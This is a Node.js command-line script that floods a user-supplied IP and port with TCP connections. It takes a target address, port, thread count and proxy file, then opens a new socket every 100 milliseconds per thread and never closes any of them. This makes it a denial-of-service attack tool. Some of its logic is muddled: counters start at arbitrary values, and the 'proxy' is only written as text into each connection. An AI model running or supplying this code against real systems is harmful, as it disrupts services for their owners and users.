const fs = require('fs');
const net = require('net');
const { argv, exit } = require('process');

const ip = argv[2];
const port = argv[3];
const threads = argv[4];
const proxyFile = argv[5];

if (!ip || !port || !threads || !proxyFile) {
  console.error('Usage: node as.js <IP> <port> <threads> <proxyFile>');
  exit(1);
}

const threadCount = parseInt(threads, 10);
if (isNaN(threadCount) || threadCount <= 0) {
  console.error('Threads must be a positive integer');
  exit(1);
}

let proxy;
try {
  proxy = fs.readFileSync(proxyFile, 'utf8').trim();
} catch (readError) {
  console.error('Error reading proxy file: ' + readError.message);
  exit(1);
}

let buffer = 7000;
let connections = 1024;
let bytesPerSecond = 5000;

function createConnection() {
  const socket = new net.Socket();
  socket.connect(port, ip, () => {
    connections++;
    console.log('Connected to ' + ip + ':' + port + ' - Total Connections: ' + connections);
    socket.write('Proxy: ' + proxy + '\r\n');
  });
  socket.on('data', (data) => {
    buffer += data.length;
  });
  socket.on('error', (socketError) => {
    console.error('Error: ' + socketError.message);
  });
}

setInterval(() => {
  bytesPerSecond = buffer;
  buffer = 7000;
}, 1000);

for (let i = 0; i < threadCount; i++) {
  (function connectLoop() {
    createConnection();
    setTimeout(connectLoop, 100);
  })();
}

setInterval(() => {
  console.log('Buffer: ' + buffer + ' bytes');
  console.log('Connections per second: ' + connections);
  console.log('Bytes per second: ' + bytesPerSecond);
}, 1000);